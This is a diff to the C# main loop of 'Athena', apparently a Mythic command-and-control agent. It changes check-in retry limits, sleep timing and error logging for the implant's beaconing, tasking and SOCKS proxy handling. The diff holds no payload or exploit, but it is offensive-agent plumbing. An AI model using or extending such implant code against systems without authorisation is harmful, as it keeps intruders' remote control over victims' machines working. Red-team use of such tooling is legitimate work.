@@ -28,7 +28,7 @@ namespace Athena
         /// </summary>
         static void Main(string[] args)
         {
-            int maxMissedCheckins = 100;
+            int maxMissedCheckins = 10;
             int missedCheckins = 0;
             bool exit = false;
 
@@ -61,15 +61,16 @@ namespace Athena
                     List<SocksMessage> socksMessages = Globals.socksHandler.GetMessages();
                     if (!checkAgentTasks(hasoutput, delegateMessages, socksMessages))
                     {
-                        missedCheckins += 1;
                         if (missedCheckins == maxMissedCheckins)
                         {
+                            Misc.WriteDebug("Max Checkins Hit. (Try)");
                             Environment.Exit(0);
                         }
                         foreach (var job in hasoutput)
                         {
                             Globals.jobs.Add(job.task.id, job);
                         }
+                        missedCheckins++;
                     }
                     else
                     {
@@ -78,11 +79,14 @@ namespace Athena
                         clearAgentTasks(hasoutput);
                     }
                 }
-                catch
+                catch (Exception e)
                 {
-                    missedCheckins += 1;
+                    Misc.WriteError(e.Message);
+                    Misc.WriteError(e.StackTrace);
+                    missedCheckins++;
                     if (missedCheckins == maxMissedCheckins)
                     {
+                        Misc.WriteDebug("Max Checkins Hit. (Catch)");
                         Environment.Exit(0);
                     }
                 }
@@ -95,7 +99,7 @@ namespace Athena
         /// </summary>
         private static CheckinResponse handleCheckin()
         {
-            int maxMissedCheckins = 100;
+            int maxMissedCheckins = 3;
             int missedCheckins = 0;
             CheckinResponse res = Globals.mc.CheckIn();
 
@@ -120,12 +124,11 @@ namespace Athena
                 }
                 catch (Exception e)
                 {
-                    Misc.WriteError("[Checkin] " + e.Message);
-                    continue;
+                    Misc.WriteError($"[HandleCheckin] {e.Message}");
+                    Misc.WriteError(e.StackTrace);
                 }
-
                 //Sleep before attempting checkin again
-                Thread.Sleep(Misc.GetSleep(Globals.mc.MythicConfig.sleep, Globals.mc.MythicConfig.jitter));
+                Thread.Sleep(Misc.GetSleep(Globals.mc.MythicConfig.sleep, Globals.mc.MythicConfig.jitter) * 1000);
             }
             return res;
         }
@@ -154,7 +157,8 @@ namespace Athena
             }
             catch (Exception e)
             {
-                Misc.WriteError(e.Message);
+                Misc.WriteError($"[UpdateAgentInfo] {e.Message}");
+                Misc.WriteError(e.StackTrace);
                 return false;
             }
         }
@@ -167,14 +171,15 @@ namespace Athena
         /// <param name="socksMessage">List of SocksMessages</param>
         private static bool checkAgentTasks(List<MythicJob> jobs, List<DelegateMessage> delegateMessages, List<SocksMessage> socksMessage)
         {
-            List<MythicTask> tasks = null;
+            List<MythicTask> tasks;
             try
             {
                 tasks = Globals.mc.GetTasks(jobs,delegateMessages,socksMessage);
             }
             catch (Exception e)
             {
-                Misc.WriteError(e.Message);
+                Misc.WriteError($"[CheckAgentTasks] {e.Message}");
+                Misc.WriteError(e.StackTrace);
                 return false;
             }
 
@@ -212,7 +217,8 @@ namespace Athena
                             }
                             catch (Exception e)
                             {
-                                Misc.WriteDebug(e.Message);
+                                Misc.WriteError($"[StartAgentJobs] {e.Message}");
+                                Misc.WriteError(e.StackTrace);
                                 job.Value.complete = true;
                                 job.Value.hasoutput = true;
                                 job.Value.taskresult = e.Message;
@@ -225,7 +231,8 @@ namespace Athena
             }
             catch (Exception e)
             {
-                Misc.WriteError(e.Message);
+                Misc.WriteError($"[StartAgentJobs2] {e.Message}");
+                Misc.WriteError(e.StackTrace);
                 return false;
             }
         }
@@ -260,6 +267,8 @@ namespace Athena
                 }
                 catch (Exception e)
                 {
+                    Misc.WriteError($"[ClearAgentTasks] {e.Message}");
+                    Misc.WriteError(e.StackTrace);
                     Misc.WriteDebug(e.Message);
                 }
             }
